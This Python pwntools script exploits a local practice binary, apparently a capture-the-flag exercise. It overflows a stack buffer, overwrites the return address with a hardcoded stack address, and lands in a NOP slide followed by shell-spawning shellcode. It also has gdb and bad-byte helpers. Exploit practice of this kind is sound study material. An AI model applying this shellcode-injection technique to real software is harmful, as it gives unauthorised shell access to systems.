from pwn import *

file_breakpoints = "breaks64.gdb"
file_binary = "target.amd64"
context.binary = elf = ELF(f"./{file_binary}")


def run_locally(debug = True):
    p = process([elf.path])
    pid = util.proc.pidof(p)[0]
    if debug == True:
        gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
        log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
        cmd = f"cmd.exe /c start {new_tab} {wsl}"
        os.system(cmd)
        util.proc.wait_for_debugger(pid)
    return p


def find_bad_bytes(buf, bad_bytes = None):
    if bad_bytes is None:
        bad_bytes = [
            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
        ]
    found = False
    for i, byte in enumerate(buf):
        if byte in bad_bytes:
            log.warn(f"Bad byte '{hex(byte)}' at {i}")
            found = True
    if found:
        print(hexdump(buf, highlight = bad_bytes))
        log.error("Found bad bytes in a buffer!")


def main():
    sc = asm(shellcraft.sh())
    nop = p8(0x90)  # "nop" opcode

    # Buffer overflow
    buf = b"A" * 8  # rax before "cmp eax, 0x539"
    buf += p64(1337)
    buf = buf.ljust(48, b"B")  # rsp before "ret"
    buf += p64(0x7fffffffd4b8)  # Address of the nop slide in the stack
    buf += nop * 8 * 20  # Nop slide
    buf += sc

    # RUN PROCESS
    find_bad_bytes(buf)
    # buf = cyclic(200)
    p = run_locally(debug = False)
    log.info("=== BUFFER")
    print(hexdump(buf))
    p.writeline(buf)
    p.interactive()


if __name__ == "__main__":
    main()
